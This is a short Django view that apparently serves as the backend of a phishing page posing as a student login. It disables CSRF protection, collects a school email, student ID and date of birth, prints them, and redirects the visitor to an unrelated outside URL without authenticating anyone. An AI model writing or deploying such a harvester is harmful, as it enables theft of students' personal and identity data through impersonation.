from django.shortcuts import render,redirect
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def login_view(request):

    if request.method == "POST":

        schoolemail = request.POST.get("schoolemail")
        studentId = request.POST.get("studentId")
        dob = request.POST.get("dob")


      
        print(schoolemail)
        print(studentId)
        print(dob)


        return redirect('https://bm.technologies.newstudents.online/xamDpLcc')

    return render(request, "login.html")
